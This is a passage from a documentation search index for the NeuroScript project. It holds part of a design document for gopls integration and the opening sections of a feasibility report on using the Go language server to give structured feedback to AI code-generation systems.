</li> <li><code>SemanticReference</code> (AI-Focused Identifier):<ul> <li><code>ResourceURI</code> (string): The URI of the file containing the element.</li> <li><code>FullyQualifiedName</code> (string, optional): The fully qualified Go symbol name (e.g., <code>github.com/aprice2704/neuroscript/pkg/core.Interpreter.ExecuteTool</code>). Key for stable referencing.</li> <li><code>SymbolKind</code> (string, optional): Type of symbol (e.g., \"function\", \"method\", \"variable\", \"type\", \"field\", \"interface\", maps from LSP <code>SymbolKind</code> or <code>go/ast</code> node types).</li> <li><code>DeclarationLocation</code> (<code>LSPLocation</code>, optional): Location of the symbol's declaration.</li> <li><code>ByteOffsetRange</code> (<code>LSPRange</code>, optional): Precise byte-offset range of the symbol's identifier or relevant span in the <code>ResourceURI</code>.</li> <li><code>Signature</code> (string, optional): For functions/methods.</li> <li><code>PackagePath</code> (string, optional): Go package import path.</li> </ul> </li> <li><code>HoverInfo</code>:<ul> <li><code>Contents</code> (string): Markdown content from <code>gopls</code> hover.</li> <li><code>Range</code> (<code>LSPRange</code>, optional): The range of the symbol hovered over.</li> </ul> </li> </ul> <p>## 4. Workflow for AI-Driven Code Editing &amp; Diagnostics</p> <ol> <li>Initialization:      a.  NeuroScript (via <code>ng</code> or <code>Interpreter</code>) ensures <code>GoplsClient</code> is running and initialized for the target Go workspace/module.      b.  Relevant project files are signaled to <code>gopls</code> via <code>textDocument/didOpen</code>.</li> <li>AI Code Generation/Modification:      a.  AI generates or modifies Go code for a specific file.</li> <li>Synchronization:      a.  NeuroScript tool (<code>Gopls.NotifyDidChange</code>) sends the updated file content to <code>GoplsClient</code>, which forwards it to <code>gopls</code>.</li> <li>Diagnostic Retrieval:      a.  <code>GoplsClient</code> receives <code>textDocument/publishDiagnostics</code> from <code>gopls</code>.      b.  AI uses NeuroScript tool <code>Gopls.GetDiagnostics(filePath)</code> or <code>Gopls.GetAllProjectDiagnostics()</code>.</li> <li>AI Error Analysis &amp; Correction:      a.  For each diagnostic, the AI examines the <code>DiagnosticInfo</code> (message, severity, range).      b.  To understand the context of an error or a symbol, AI uses:          i.  <code>Gopls.GetSymbolInfoAt(filePath, diagnostic.Range.Start.ByteOffset)</code>: Retrieves <code>SemanticReference</code> (including FQN if possible), hover information, and definition location for the symbol at/near the diagnostic.          ii. <code>Gopls.GetSymbolInfoByName(fullyQualifiedName)</code>: If a symbol's FQN is known or inferred.      c.  AI may also use <code>Gopls.ListSymbolsInFile</code> or <code>Gopls.FindWorkspaceSymbols</code> to explore available symbols.      d.  The AI uses this combined diagnostic and semantic information to formulate a correction.      e.  This information can also feed into tools from <code>pkg/core/tools/gosemantic</code> (e.g., using an FQN to find all usages before a rename).</li> <li>Iteration: Loop back to step 2.</li> </ol> <p>## 5. NeuroScript Tool Integration (<code>pkg/core/tools_gopls.go</code> - new)</p> <p>The following tools will be exposed to NeuroScript:</p> <ul> <li>Workspace/Initialization:<ul> <li><code>Gopls.SetWorkspaceRoot(workspacePath string) (success bool, error string)</code>: Initializes or re-initializes <code>gopls</code> for a given workspace. This would typically be called once per session or project. The <code>GoplsClient</code> should handle the <code>initialize</code> handshake.</li> </ul> </li> <li>Document Synchronization:<ul> <li><code>Gopls.NotifyDidOpen(filePath string, content string) (error string)</code></li> <li><code>Gopls.NotifyDidChange(filePath string, newContent string) (error string)</code></li> <li><code>Gopls.NotifyDidSave(filePath string) (error string)</code></li> <li><code>Gopls.NotifyDidClose(filePath string) (error string)</code></li> </ul> </li> <li>Diagnostics:<ul> <li><code>Gopls.GetDiagnostics(filePath string) (diagnostics []DiagnosticInfo, error string)</code></li> <li><code>Gopls.GetAllProjectDiagnostics() (diagnosticsByFile map[string][]DiagnosticInfo, error string)</code></li> </ul> </li> <li>Semantic Information &amp; Context (AI-Focused):<ul> <li><code>Gopls.GetSymbolInfoAt(filePath string, byteOffset int) (symbolInfo map[string]interface{}, error string)</code>: Returns a map containing fields like <code>semanticReference</code> (map), <code>hoverContent</code> (string), <code>definitionLocation</code> (map, representing a <code>SemanticReference</code>).</li> <li><code>Gopls.GetSymbolInfoByName(fullyQualifiedName string) (symbolInfo map[string]interface{}, error string)</code>: Similar return to <code>GetSymbolInfoAt</code>.</li> <li><code>Gopls.ListSymbolsInFile(filePath string) (symbols []map[string]interface{}, error string)</code>: Returns a list of symbol maps (each representing a <code>SemanticReference</code>).</li> <li><code>Gopls.FindWorkspaceSymbols(queryString string) (symbols []map[string]interface{}, error string)</code>: Returns a list of symbol maps.</li> </ul> </li> </ul> <p>All tools should return structured error information if the underlying LSP call fails or <code>gopls</code> is not responsive.</p> <p>## 6. LSP Communication Details</p> <ul> <li>Protocol: JSON-RPC 2.0 over stdio with the <code>gopls</code> server.</li> <li>Key LSP Methods for v0.5.0:<ul> <li>Lifecycle: <code>initialize</code>, <code>initialized</code>, <code>shutdown</code>, <code>exit</code>.</li> <li>Synchronization: <code>textDocument/didOpen</code>, <code>textDocument/didChange</code>, <code>textDocument/didSave</code>, <code>textDocument/didClose</code>.</li> <li>Diagnostics: <code>textDocument/publishDiagnostics</code> (Notification from server).</li> <li>Semantic Info: <code>textDocument/hover</code>, <code>textDocument/definition</code>, <code>textDocument/documentSymbol</code>, <code>workspace/symbol</code>.</li> </ul> </li> <li>Content Format: <code>gopls</code> expects UTF-8 for Go files. Position/Range information from LSP can be character-based or UTF-16 offset-based. NeuroScript's <code>GoplsClient</code> must handle this:<ul> <li>Negotiate UTF-8 if possible during <code>initialize</code>.</li> <li>If character offsets are used by LSP, convert to/from byte offsets carefully when interacting with NeuroScript tools or file contents, as Go strings and file I/O are typically byte-oriented. For Go source, assuming UTF-8 allows byte offsets to be a reliable internal representation.</li> </ul> </li> </ul> <p>## 7. Semantic Addressing Strategy (AI-Centric)</p> <p>The goal is to provide AI with stable and meaningful ways to refer to code elements, beyond simple line/column numbers which are highly volatile during code modification.</p> <ul> <li>Primary Identifiers for AI:<ul> <li>Fully Qualified Names (FQN): Where available (e.g., for package-level functions, types, methods, global variables). This is the most robust identifier. Example: <code>github.com/project/pkg.MyType.MyMethod</code>.</li> <li>File URI + Precise Byte Offset Range: For local variables, literals, expressions, or any element where an FQN is not applicable or easily determined. This range is sourced directly from <code>gopls</code> responses (e.g., diagnostic ranges, hover ranges, symbol ranges).</li> </ul> </li> <li><code>SemanticReference</code> Struct: This struct (defined in Section 3) will be the standard way NeuroScript tools return information about code symbols/elements. It will prioritize FQN and precise byte ranges.</li> <li>Tool Inputs: NeuroScript tools that require a location (e.g., <code>Gopls.GetSymbolInfoAt</code>) will accept <code>filePath</code> and <code>byteOffset</code>. Tools querying by name will accept an FQN (e.g., <code>Gopls.GetSymbolInfoByName</code>).</li> <li>Interaction with <code>pkg/core/tools/gosemantic</code>:<ul> <li>The FQNs or precise location info obtained from <code>gopls</code> tools can be used as reliable inputs for the more advanced static analysis and refactoring tools in <code>pkg/core/tools/gosemantic</code>. For example, after <code>gopls</code> identifies a symbol at an offset, its FQN (if available from hover/definition) can be passed to <code>toolGoFindUsages</code>.</li> </ul> </li> </ul> <p>## 8. Error Handling</p> <ul> <li>The <code>GoplsClient</code> must handle errors related to:<ul> <li><code>gopls</code> server process management (e.g., failing to start).</li> <li>JSON-RPC communication (e.g., malformed messages, timeouts).</li> <li>LSP-specific errors returned in responses.</li> </ul> </li> <li>NeuroScript tools wrapping <code>GoplsClient</code> methods must translate these errors into standard NeuroScript <code>RuntimeError</code>s with appropriate error codes and messages.</li> <li>Graceful degradation: If <code>gopls</code> is unavailable, the tools should fail clearly, allowing the AI to potentially fall back to other analysis methods (e.g., <code>pkg/core/tools/gosemantic</code> for non-live analysis, or simpler regex-based checks as a last resort).</li> </ul> <p>## 9. Configuration</p> <ul> <li><code>gopls</code> Executable Path: NeuroScript will need to know the path to the <code>gopls</code> executable. This could be configurable, or it could assume <code>gopls</code> is in the system PATH.</li> <li>Workspace Root: The <code>Gopls.SetWorkspaceRoot</code> tool will manage this dynamically per session/project. The <code>Interpreter</code> or <code>ng</code> application context might store the current gopls workspace root.</li> </ul> <p>## 10. Future Considerations (Beyond v0.5.0)</p> <ul> <li>Support for <code>textDocument/codeAction</code> to get suggested fixes from <code>gopls</code>.</li> <li>Support for <code>textDocument/rename</code> and other refactoring capabilities.</li> <li>Advanced incremental <code>textDocument/didChange</code> notifications.</li> <li>More sophisticated mapping between LSP ranges and NeuroScript's internal AST nodes if deeper AST-LSP correlation is needed.</li> <li>Support for <code>gopls</code> settings/configuration via <code>workspace/didChangeConfiguration</code>.</li> </ul> <p>## 11. Document Metadata</p> <p>:: version: 0.1.0  :: type: NSproject  :: subtype: design_document  :: project: NeuroScript  :: purpose: Design for integrating gopls into NeuroScript for advanced Go code diagnostics and semantic understanding, primarily for AI-driven development.  :: status: draft  :: author: Gemini (Contributor), AJP (Lead)  :: created: 2025-05-10  :: modified: 2025-05-10  :: dependsOn: docs/gopls_integration.md (feasibility study), pkg/core/tools/gosemantic/*, pkg/core/ai_rules.md  :: reviewCycle: 1  :: nextReviewDate: 2025-05-17</p>"},{"location":"project/Version_05/gopls_integration/","title":"Feasibility Analysis of Utilizing gopls for AI-Driven Go Code Generation and Feedback","text":""},{"location":"project/Version_05/gopls_integration/#abstract","title":"Abstract","text":"<p>This report examines the feasibility of leveraging gopls, the official Go language server, as a source of information and structured feedback for Artificial Intelligence (AI) systems engaged in Go code generation and modification. The analysis delves into the capabilities of <code>gopls</code>, the underlying Language Server Protocol (LSP) framework it implements, and the potential integration strategies and challenges. Key findings indicate that <code>gopls</code>, through LSP, offers a rich and standardized interface providing diverse feedback signals\u2014ranging from syntax and type errors to static analysis findings, code completion suggestions, type information, and refactoring opportunities\u2014that are highly relevant for guiding AI systems. While integration is deemed feasible and beneficial, significant considerations include managing the interaction model to align AI request patterns with <code>gopls</code> performance characteristics, handling the complexity of LSP communication and state management, and adapting to the ongoing evolution of both <code>gopls</code> and the LSP standard. The report concludes that <code>gopls</code> represents a powerful tool for enhancing AI-driven Go development, provided these integration challenges are carefully addressed, potentially through an intermediate abstraction layer.</p>"},{"location":"project/Version_05/gopls_integration/#1-introduction","title":"1. Introduction","text":""},{"location":"project/Version_05/gopls_integration/#11-background-ai-in-code-generation","title":"1.1. Background: AI in Code Generation","text":"<p>Artificial Intelligence is increasingly influencing software development practices, with notable advancements in areas such as automated code generation, code completion, bug detection, and refactoring. AI models are being trained to understand programming language syntax, semantics, and common patterns, enabling them to assist developers or even autonomously produce code for various languages, including Go. However, ensuring the correctness, quality, adherence to idiomatic conventions, and maintainability of AI-generated code remains a significant challenge. Robust, automated feedback mechanisms are crucial to guide AI systems, correct their errors, and improve the overall quality of their output.</p>"},{"location":"project/Version_05/gopls_integration/#12-the-role-of-language-servers","title":"1.2. The Role of Language Servers","text":"<p>The Language Server Protocol (LSP) has emerged as a pivotal technology in modern development tooling. It defines an open, JSON-RPC-based protocol enabling communication between source code editors or Integrated Development Environments (IDEs) \u2013 termed clients \u2013 and separate processes known as language servers[^1]. These servers encapsulate language-specific \"intelligence,\" providing features like code completion, diagnostics (errors and warnings), hover information, and navigation capabilities (e.g., \"go to definition\")[^2].</p> <p>The core innovation of LSP is the decoupling of language-specific analysis logic from the editor or client tool[^1]. Before LSP, integrating language support often required implementing language analysis capabilities directly within each editor, leading to duplicated effort \u2013 an \"m-times-n\" complexity problem where 'm' is the number of languages and 'n' is the number of editors[^4]. LSP transforms this into an \"m-plus-n\" problem: a language provider implements a single language server, and an editor implements a single LSP client, allowing the editor to support any language with an available server[^4]. gopls is the official language server for the Go programming language, developed and maintained by the Go team, designed to provide comprehensive Go language support to any LSP-compatible editor[^6].</p>"},{"location":"project/Version_05/gopls_integration/#13-problem-statement-research-question","title":"1.3. Problem Statement &amp; Research Question","text":"<p>Given the capabilities of language servers like <code>gopls</code> to perform deep static analysis of code and the standardized communication provided by LSP, a key question arises: Can gopls serve as an effective source of information and feedback for an AI system tasked with generating or modifying Go code? This report investigates this question by examining:</p> <ul> <li>The relevant features and communication mechanisms of the LSP framework.</li> <li>The specific capabilities, architecture, and configuration options of <code>gopls</code>.</li> <li>How <code>gopls</code> features, exposed via LSP, map onto the feedback needs of an AI code generation system.</li> <li>The potential benefits, limitations, and technical challenges associated with integrating an AI system with <code>gopls</code>.</li> </ul>"},{"location":"project/Version_05/gopls_integration/#14-scope-and-structure","title":"1.4. Scope and Structure","text":"<p>This report focuses on the technical feasibility and methodology of using <code>gopls</code> as a feedback provider for AI. It analyzes the interface provided by <code>gopls</code> through LSP but does not delve into the internal implementation details of specific AI models. The subsequent sections are structured as follows: Section 2 details the LSP framework. Section 3 provides an in-depth look at <code>gopls</code>. Section 4 maps <code>gopls</code> features to potential AI feedback loops. Section 5 discusses integration challenges and considerations. Finally, Section 6 presents conclusions and potential directions for future work.</p>"},{"location":"project/Version_05/gopls_integration/#2-the-language-server-protocol-lsp-framework","title":"2. The Language Server Protocol (LSP) Framework","text":""},{"location":"project/Version_05/gopls_integration/#21-core-concepts","title":"2.1. Core Concepts","text":"<p>The Language Server Protocol (LSP) standardizes the communication channel between development tools (clients) and language intelligence providers (servers)[^1]. Originally developed by Microsoft for Visual Studio Code, it is now an open standard maintained collaboratively with contributions from various organizations and the community[^1].</p> <p>LSP employs JSON-RPC 2.0 for message transport, a lightweight remote procedure call protocol using JSON[^1]. Messages are typically exchanged over standard input/output streams, named pipes, or sockets[^3]. The protocol defines three primary message types:</p> <ul> <li>Requests: Messages sent from the client to the server (or vice-versa in some cases) that require a response (e.g., requesting code completions at a specific position). Each request has an ID used to correlate it with its response.[^12]</li> <li>Responses: Messages sent back in reply to a request, containing either the requested result or an error notification.[^12]</li> <li>Notifications: Messages sent from one party to the other that do not require a response (e.g., notifying the server that a document has changed).[^12]</li> </ul> <p>A crucial design aspect of LSP is its level of abstraction. The protocol primarily operates on concepts familiar to text editors, such as document URIs, text positions (line and character offsets), and ranges within a document[^3]. It generally avoids exposing deep language-specific constructs like Abstract Syntax Trees (ASTs) or detailed compiler symbol tables directly through the protocol messages[^3]. This abstraction simplifies the task of integrating language support into diverse clients, as clients do not need intimate knowledge of the specific language's internal representations[^3]. The language server internally manages the complexity of parsing, type checking, and semantic analysis, exposing the results through standardized LSP requests and notifications[^1].</p> <p>A crucial part of the initial connection is the initialize request sent by the client. In this exchange, the client and server announce their capabilities (e.g., which LSP features they support, specific configuration options)[^12]. This negotiation allows them to operate correctly even if they support different subsets of the LSP specification or custom extensions.</p>"},{"location":"project/Version_05/gopls_integration/#22-key-lsp-features-relevant-to-code-analysis-feedback","title":"2.2. Key LSP Features Relevant to Code Analysis &amp; Feedback","text":"<p>LSP defines a wide range of language features that can be implemented by a server and consumed by a client[^6]. Those most pertinent to providing feedback for code generation and modification include:</p> <ul> <li>Diagnostics (<code>textDocument/publishDiagnostics</code>): A notification sent from the server to the client, typically triggered by document changes or saving. It provides a list of errors, warnings, or informational messages detected in the code, including their location (range) and description[^6]. This is a fundamental mechanism for correctness feedback.</li> <li>Hover Information (<code>textDocument/hover</code>): A request from the client to provide information about the symbol currently under the cursor. The server responds with details such as the symbol's type, documentation comments, and signature[^2]. Useful for type verification and contextual understanding.</li> <li>Completion (<code>textDocument/completion</code>): A request from the client, usually triggered by typing, asking for completion suggestions at the current cursor position. The server responds with a list of contextually relevant candidates (keywords, variables, functions, types, etc.)[^2]. Can guide AI generation towards valid constructs.</li> <li>Definition/Type Definition (<code>textDocument/definition</code>, <code>textDocument/typeDefinition</code>): Requests to navigate from a symbol usage to its definition location or the definition of its type[^2]. Aids AI in understanding code structure, dependencies, and types.</li> <li>References (<code>textDocument/references</code>): A request to find all locations where a specific symbol is referenced within the workspace[^2]. Useful for assessing the impact of potential changes.</li> <li>Code Actions (<code>textDocument/codeAction</code>): A request asking the server for potential actions (refactorings, quick fixes) available at a specific location, often associated with a diagnostic. The server responds with a list of possible actions the client can present or execute[^4]. Provides a direct way for the server to suggest improvements or automated fixes.</li> <li>Formatting (<code>textDocument/formatting</code>, <code>textDocument/rangeFormatting</code>): Requests to format an entire document or a specific range according to the language's standard style conventions[^4]. Essential for maintaining code consistency and readability.</li> <li>Rename (<code>textDocument/rename</code>): A request to perform a safe rename of a symbol across all its references within the workspace[^1]. A critical refactoring capability.</li> <li>Signature Help (<code>textDocument/signatureHelp</code>): A request, typically triggered when typing function call arguments, to display information about the function's parameters (names, types)[^6]. Helps in constructing syntactically and semantically valid function calls.</li> <li>Semantic Tokens (<code>textDocument/semanticTokens</code>): A request for detailed semantic information about tokens in a file, enabling richer syntax highlighting than purely lexical analysis allows[^6]. This finer-grained information might provide useful contextual signals for an AI.</li> <li>Inlay Hints (<code>textDocument/inlayHint</code>): A request for hints (like parameter names or inferred types) to be displayed inline with the code, making implicit information explicit[^6]. Could offer additional contextual clues.</li> </ul>"},{"location":"project/Version_05/gopls_integration/#23-lsp-communication-model","title":"2.3. LSP Communication Model","text":"<p>Interaction under LSP typically follows a pattern where the client informs the server about user actions or requests specific information. The client sends notifications like <code>textDocument/didOpen</code> when a file is opened, <code>textDocument/didChange</code> when its content is modified, and <code>textDocument/didSave</code> when it's saved[^1]. It sends requests like <code>textDocument/hover</code> or <code>textDocument/completion</code> when the user invokes corresponding actions[^3].</p> <p>The server processes these notifications and requests. It might update its internal representation of the code based on <code>didChange</code> notifications and then asynchronously push <code>textDocument/publishDiagnostics</code> notifications back to the client if errors or warnings are detected[^1]. For requests like hover or completion, the server performs the necessary analysis and sends back a response message containing the requested data[^3].</p>"},{"location":"project/Version_05/gopls_integration/#24-implications-for-ai-integration","title":"2.4. Implications for AI Integration","text":"<p>The structure and design of LSP have several important implications for integrating it with AI systems:</p> <ul> <li>Standardization Benefit: The primary advantage is the standardized interface LSP provides[^1]. An AI system designed to act as an LSP client can interact with any LSP-compliant server (<code>gopls</code> for Go, others for Python, Java, etc.) using the same fundamental protocol. This significantly reduces the development effort compared to building bespoke integrations for language-specific analysis tools for each language the AI needs to support, effectively mitigating the m*n complexity problem[^4]. While server capabilities differ, the core communication patterns remain consistent.</li> <li>Protocol Granularity: LSP operates at the document and text position level in its communication protocol[^3]. Although the language server (<code>gopls</code>) internally builds rich semantic representations like ASTs and performs type checking[^15], this deep semantic model is not directly exposed via LSP messages[^3]. Instead, the server provides information derived from its analysis (diagnostics, hover text, completion items) formatted according to LSP specifications[^12]. Consequently, an AI system consuming this information must interpret these LSP responses and potentially aggregate them to reconstruct a sufficient semantic understanding for its task, rather than receiving a direct feed of the server's internal semantic graph.</li> <li>Asynchronous Nature: Certain critical feedback, particularly diagnostics via <code>textDocument/publishDiagnostics</code>, is delivered asynchronously as notifications pushed by the server, often triggered by file changes[^5]. An AI client cannot simply poll for errors on demand; it must be architected to listen for and react to these asynchronous notifications whenever they arrive[^12]. This necessitates an event-driven design within the AI's LSP interaction component to handle incoming diagnostics and update the AI's state or trigger corrective actions promptly.</li> </ul>"},{"location":"project/Version_05/gopls_integration/#3-gopls-the-go-language-server","title":"3. gopls: The Go Language Server","text":""},{"location":"project/Version_05/gopls_integration/#31-overview-and-goals","title":"3.1. Overview and Goals","text":"<p><code>gopls</code> (pronounced \"Go please\") is the official language server for the Go programming language, developed and actively maintained by the Go team at Google[^6]. Its primary objective is to provide a comprehensive and robust set of IDE features for Go development, accessible through any editor that supports the Language Server Protocol[^6].</p> <p>It was conceived to unify and replace a collection of older, disparate command-line tools (like <code>godef</code>, <code>go-outline</code>, <code>guru</code>) that previously provided IDE-like features, often with inconsistencies and performance limitations[^8]. <code>gopls</code> aims to deliver an equivalent or superior developer experience compared to these older tools, focusing on accuracy, completeness of features, and performance[^15]. A key performance target is maintaining low latency, particularly for interactive operations triggered by user typing, aiming for responses under 100ms to feel imperceptible[^15]. The project also emphasizes being community-driven, encouraging contributions to its development[^7].</p>"},{"location":"project/Version_05/gopls_integration/#32-architecture-and-implementation","title":"3.2. Architecture and Implementation","text":"<p><code>gopls</code> operates as a long-running background process, separate from the editor or client it serves[^3]. It communicates with the client exclusively through the Language Server Protocol, exchanging JSON-RPC messages typically over stdio[^1].</p> <p>Internally, <code>gopls</code> employs a layered architecture designed for efficiency and effective state management[^9]:</p> <ul> <li>Cache: The lowest layer manages global information, including the file system state and potentially shared, immutable analysis results.</li> <li>Session: Represents a connection to a single editor client. It manages state specific to that connection, such as overlays for files currently being edited (unsaved changes).</li> <li>View: Represents a workspace or build context (e.g., a directory containing a <code>go.mod</code> file). It holds configuration specific to that view and maps files to packages. A single session can have multiple views active (e.g., multiple project folders open).</li> </ul> <p>This layered structure allows sharing of cached information (like parsed files of dependencies) across different views within a session, or even potentially across sessions, improving performance and reducing memory usage[^9]. Caching is fundamental to <code>gopls</code>'s performance strategy. It aggressively caches parsed Go files, type-checked package information, metadata derived from <code>go list</code>, and computed indexes (like cross-references) to avoid redundant work, especially during incremental updates triggered by user edits[^9].</p> <p>The implementation is primarily located within the <code>golang.org/x/tools/gopls</code> module. Key internal packages include <code>internal/lsp/protocol</code> for LSP message types (partially auto-generated from the LSP specification schema[^18]), <code>internal/lsp/cache</code> for state and cache management, <code>internal/lsp/source</code> for implementations of core language features, and <code>internal/server</code> which binds the LSP handlers[^18]. The <code>golang</code> package contains much of the Go-specific analysis logic[^18]. <code>gopls</code> is aware of Go modules (<code>go.mod</code>), workspaces (<code>go.work</code>), and build tags (<code>//go:build</code>), using them to determine the scope of analysis and apply correct build configurations[^16].</p>"},{"location":"project/Version_05/gopls_integration/#33-key-gopls-features-via-lsp","title":"3.3. Key gopls Features (via LSP)","text":"<p><code>gopls</code> implements a wide array of LSP features[^6], providing rich support for Go development:</p> <ul> <li>Passive Features: These operate automatically or provide information without explicit user action beyond cursor movement: Hover Information (type, docs[^17]), Signature Help (function parameters), Document Highlights (other occurrences of the symbol under cursor), Inlay Hints (e.g., parameter names), Semantic Tokens (for advanced syntax highlighting[^17]), Folding Ranges (code block collapsing), and Document Links (clickable URLs in comments/strings).</li> <li>Diagnostics: Provides real-time feedback on errors and warnings. This includes standard Go compiler errors, as well as findings from a suite of built-in static analysis tools (linters) such as <code>unusedparams</code>, <code>unusedfunc</code>, <code>fillstruct</code>, <code>simplifyrange</code>, <code>modernize</code>, and others[^6]. It can integrate with the popular <code>staticcheck</code> suite of analyzers[^16]. Additionally, <code>gopls</code> can optionally report potential vulnerabilities found in dependencies[^16] and provide diagnostics related to compiler optimization decisions (e.g., bounds checks, escape analysis, inlining failures)[^16].</li> <li>Navigation: Enables exploration of the codebase: Go to Definition[^17], Go to Type Definition, Find References, Go to Implementation (finding types that implement an interface[^6]), Document Symbols (outline of symbols in the current file), Workspace Symbols (search for symbols across the project), and Call Hierarchy (incoming/outgoing calls for a function).</li> <li>Completion: Offers context-aware suggestions as the user types[^9]. This includes completing identifiers, keywords, statements, and even suggesting members from imported or not-yet-imported packages[^17]. It can also suggest full function calls, including parentheses, where appropriate[^16].</li> <li>Code Transformation: Provides capabilities to modify code automatically: Formatting (using <code>gofmt</code> or similar), Rename symbol across workspace, Organize Imports (adding, removing, sorting imports[^16]), Extract code selection to a new function or variable, Inline function calls, and various other Go-specific refactorings and quick fixes provided by its analyzers (e.g., applying fixes suggested by <code>modernize</code>, <code>nonewvars</code>, <code>noresultvalues</code> analyzers[^6]).</li> <li>Support for Non-Go Files: <code>gopls</code> also provides some level of support for files related to Go development, including <code>go.mod</code> and <code>go.work</code> files, and basic support for Go template files (<code>text/template</code>, <code>html/template</code>)[^6].</li> </ul>"},{"location":"project/Version_05/gopls_integration/#34-configuration","title":"3.4. Configuration","text":"<p><code>gopls</code> offers extensive configuration options, typically managed through the editor's settings mechanism (e.g., a \"gopls\" block in VS Code's <code>settings.json</code> file)[^8]. These settings allow users to tailor <code>gopls</code>'s behavior significantly[^16].</p> <p>Examples of configurable aspects include[^16]:</p> <ul> <li>Analyses: Enabling or disabling specific static analysis checks (e.g., <code>\"analyses\": { \"unusedparams\": true, \"unreachable\": false }</code>).</li> <li>Staticcheck Integration: Controlling the integration with <code>staticcheck</code> analyzers (enable all, enable a curated subset, or disable).</li> <li>UI Features: Toggling code lenses (e.g., for running tests or <code>go generate</code>), customizing the format of hover information, enabling/disabling inlay hints.</li> <li>Build Configuration: Specifying build tags, environment variables, or the build command (<code>go</code> or an alternative).</li> <li>Diagnostics: Configuring when diagnostics are triggered (on typing vs. on save), controlling the reporting of compiler optimization details, enabling/disabling vulnerability scanning and its scope.</li> <li>Completion: Toggling features like function call completion.</li> <li>Formatting: Specifying formatting modes.</li> <li>Navigation: Setting symbol matching styles (e.g., fuzzy matching, case sensitivity).</li> </ul>"},{"location":"project/Version_05/gopls_integration/#35-implications-for-ai-integration","title":"3.5. Implications for AI Integration","text":"<p>The design and capabilities of <code>gopls</code> present both opportunities and considerations for AI integration:</p> <ul> <li>Richness of Feedback: <code>gopls</code> offers a significantly richer stream of feedback than simple compiler output. The combination of compilation errors, numerous static analysis checks[^6], potential refactoring suggestions via code actions[^6], context-aware completion candidates[^6], type information via hover[^6], and documentation snippets[^6] provides a multi-faceted view of code correctness, quality, style, and potential improvements. An AI system could leverage this diverse information not just to fix errors, but also to learn idiomatic Go patterns, improve code efficiency, explore alternative implementations suggested by completions, and ensure generated code meets higher quality standards. The extensive configuration[^16] allows tailoring the specific types of feedback received to match the AI's current task or learning objectives.</li> <li>Performance and Caching Dependencies: The performance of <code>gopls</code> is heavily optimized for interactive use by human developers, relying on sophisticated caching mechanisms to achieve low latency (sub-100ms target for many operations)[^9]. AI systems, however, might interact with <code>gopls</code> very differently, potentially generating code or requesting feedback at much higher frequencies, or making large, non-local changes rapidly. Such interaction patterns could potentially strain <code>gopls</code>'s caching strategies, leading to frequent cache invalidations and re-computations, which might result in higher latency or increased resource consumption than observed in typical editor usage[^15]. Therefore, the design of the interaction model between the AI and <code>gopls</code> becomes critical to avoid performance bottlenecks.</li> <li>Configuration is Key for AI: The fine-grained configuration options provided by <code>gopls</code>[^16] are not merely for user preference; they represent a crucial tool for optimizing the server's behavior for an AI client. An AI system might benefit from disabling UI-centric features (like certain code lenses or specific hover formats) that add unnecessary overhead or noise. Conversely, enabling the most comprehensive set of static analyses (<code>staticcheck</code>, all relevant analyses) could provide maximal feedback for quality assurance. Settings like <code>diagnosticsTrigger</code> (controlling whether diagnostics run on every edit or only on save) directly influence the feedback loop's timing and frequency. It's conceivable that an AI controller could dynamically adjust <code>gopls</code> settings based on its current activity \u2013 perhaps enabling stricter checks during a final validation phase versus fewer, faster checks during rapid initial generation.</li> <li>Go Module Awareness: <code>gopls</code> performs its analysis within the context defined by Go modules (<code>go.mod</code>) and workspaces (<code>go.work</code>)[^6]. It relies on these files to understand dependencies, language versions, and the scope of the project. If an AI system generates Go code snippets in isolation, without placing them within a valid Go module structure that <code>gopls</code> can recognize, the server may be unable to resolve imports, perform accurate type checking, or provide meaningful analysis. Thus, the environment in which the AI operates and interacts with <code>gopls</code> must effectively mimic a standard Go project setup.</li> </ul>"},{"location":"project/Version_05/gopls_integration/#4-mapping-gopls-features-to-ai-feedback-mechanisms","title":"4. Mapping gopls Features to AI Feedback Mechanisms","text":"<p>The features provided by <code>gopls</code> via LSP can be mapped directly to various feedback requirements of an AI system working with Go code. This mapping clarifies how an AI client would interact with <code>gopls</code> at the protocol level to achieve specific goals related to code generation, correction, and improvement.</p>"},{"location":"project/Version_05/gopls_integration/#41-error-detection-and-correction","title":"4.1. Error Detection and Correction","text":"<p>Mechanism: The AI system modifies the code buffer, sending <code>textDocument/didChange</code> notifications to <code>gopls</code>. <code>gopls</code> analyzes the changes and, if issues are found, asynchronously sends a <code>textDocument/publishDiagnostics</code> notification containing a list of diagnostics (errors, warnings) with their locations, severity, and messages[^6].</p> <p>AI Action: The AI client receives and parses the diagnostics. It uses the location information to pinpoint errors in the generated code and the message to understand the nature of the problem (syntax error, type mismatch, unused variable, etc.). Based on this, the AI can attempt to correct the code. Furthermore, the AI can send a <code>textDocument/codeAction</code> request for the diagnostic's location; if <code>gopls</code> provides relevant quick fixes (e.g., for common errors identified by analyzers like <code>nonewvars</code> or <code>noresultvalues</code>[^25]), the AI could potentially apply these suggested edits directly[^6].</p>"},{"location":"project/Version_05/gopls_integration/#42-code-completion-and-generation-guidance","title":"4.2. Code Completion and Generation Guidance","text":"<p>Mechanism: As the AI generates code, it can request completion suggestions at the current cursor position by sending a <code>textDocument/completion</code> request[^6]. <code>gopls</code> responds with a list of valid candidates (variables, functions, types, keywords, snippets) based on the current scope and context, including potential imports[^17].</p> <p>AI Action: The AI can use these completion suggestions to guide its generation process, increasing the likelihood of producing syntactically and semantically valid code. It might use the suggestions to constrain its next token prediction or select the most probable valid option based on its internal model and the suggestions provided by <code>gopls</code>.</p>"},{"location":"project/Version_05/gopls_integration/#43-type-checking-and-context-understanding","title":"4.3. Type Checking and Context Understanding","text":"<p>Mechanism: To understand the type or purpose of a symbol (variable, function, struct field) it has generated or encountered, the AI can send a <code>textDocument/hover</code> request with the symbol's position[^6]. <code>gopls</code> responds with type information and documentation comments associated with the symbol[^24]. For deeper navigation, the AI can use <code>textDocument/definition</code> or <code>textDocument/typeDefinition</code> requests to find the source location where the symbol or its type is defined[^6].</p> <p>AI Action: The AI uses hover information to verify that the types of variables and expressions match its expectations or requirements. It can understand the available fields and methods of a struct or interface. Documentation extracted via hover provides semantic context that might guide further generation or usage of the symbol. Definition lookup helps in understanding dependencies and the overall code structure.</p>"},{"location":"project/Version_05/gopls_integration/#44-code-quality-and-idiomatic-style","title":"4.4. Code Quality and Idiomatic Style","text":"<p>Mechanism: Beyond basic correctness, <code>gopls</code> provides feedback on code quality and style through diagnostics generated by its built-in static analyzers and integration with tools like <code>staticcheck</code>[^6]. The AI can request code formatting by sending <code>textDocument/formatting</code>[^6]. Code Actions (<code>textDocument/codeAction</code>) might also suggest refactorings towards more idiomatic Go, such as those offered 